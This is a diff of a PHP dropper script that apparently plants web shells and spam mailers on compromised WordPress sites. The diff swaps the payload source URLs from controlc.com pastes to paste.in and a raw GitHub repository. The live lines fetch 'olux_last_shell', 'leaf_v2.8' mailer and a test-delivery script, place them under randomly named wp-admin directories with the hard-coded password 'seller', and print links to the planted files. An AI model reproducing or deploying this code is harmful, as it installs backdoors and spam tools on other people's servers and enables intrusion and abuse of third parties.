@@ -67,24 +67,24 @@ return $data;
 }
 }
 
-//$mailer = 'https://controlc.com/9266029d/fullscreen.php?hash=b2c0da84e4310add65f4b49bedc9783f'; //NineMailer
-//$mailer = 'https://controlc.com/b0084ebd/fullscreen.php?hash=1874a5bedbd32380c0d6ef62419d794b'; //leaf_v2.7
-//$shell = 'https://controlc.com/e701c4ab/fullscreen.php?hash=87db0a526157145873be5b56f685d258'; // lite_shell
-//$shell = 'https://controlc.com/3d9876d4/fullscreen.php?hash=394328ff55381a41d139cfd5272979f0'; // fox_shell
-//$shell = 'https://controlc.com/7052a30e/fullscreen.php?hash=83910ec7ace7a7b34074832145e4ba09'; // sts_shell
-//$shell = 'https://controlc.com/58dc43d4/fullscreen.php?hash=6f0062b62c3962ee8f6a57b8099c4c96'; // olux_decode_shell 
-//$shell = 'https://controlc.com/cb19da33/fullscreen.php?hash=aba4f5ea9840378a838c0fa8a392dee8'; // readme_shell 
+//$mailer = 'https://paste.in/raw/lR7JG9'; //NineMailer
+//$mailer = 'https://paste.in/raw/1UhL7O'; //leaf_v2.7
+//$shell = 'https://paste.in/raw/N7lCjf'; // lite_shell
+//$shell = 'https://paste.in/raw/Jj4vAt'; // fox_shell
+//$shell = 'https://paste.in/raw/AqzSZY'; // sts_shell
+//$shell = 'https://paste.in/raw/mmbi3x'; // olux_decode_shell 
+//$shell = 'https://pasteio.com/raw/xY9T7miNQJlC'; // readme_shell  
 
-$shell = 'https://controlc.com/80a7cad5/fullscreen.php?hash=4fecee036a2b8635203f6768becd4f80'; // olux_last_shell 
-$mailer = 'https://controlc.com/8d4d37ce/fullscreen.php?hash=b4c2f3593409129c3910e02b012675af'; //leaf_v2.8 
-$test = 'https://controlc.com/887e2b7f/fullscreen.php?hash=1cd4c7eb98f9e78bfc22a077265b01ce'; //test_delivery
+$shell = 'https://raw.githubusercontent.com/rotinabox/requests/main/olux_last_shell.php'; // olux_last_shell
+$mailer = 'https://raw.githubusercontent.com/rotinabox/requests/main/leafmailer_v2.8.php'; //leaf_v2.8 
+$test = 'https://raw.githubusercontent.com/rotinabox/requests/main/testsend.php'; //test_delivery
 
 $input = array('leopard','lion','male','cock','drake','penguin','quail','rat','serval','swan','bear','baboon','alpaca','zebra','yak','wolf','turkey','toad','baby','calf','cria','chick','fawn','pup','kit','nymph','swarm');
 $rand_keys = array_rand($input, 2);
 
 if(isset($_GET['s1']) or isset($_GET['m1'])) {
 $random = $input[$rand_keys[0]].rand(999, 123);
-$dir = 'wp-admin';
+$dir = 'wp-admin/';
 $rid = $abcd."/";
 $pass = 'seller';
 $leaf = $random; $system = $random; $tacos = $random;
@@ -241,6 +241,5 @@ $print = "__$print";
 $print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
 echo "<a href="."http://$azzouz/$print"." target="."_blank".">$azzouz/$print"."</a><br>";
 }}}}}
-
 
 #-#-#-#-#-#*/
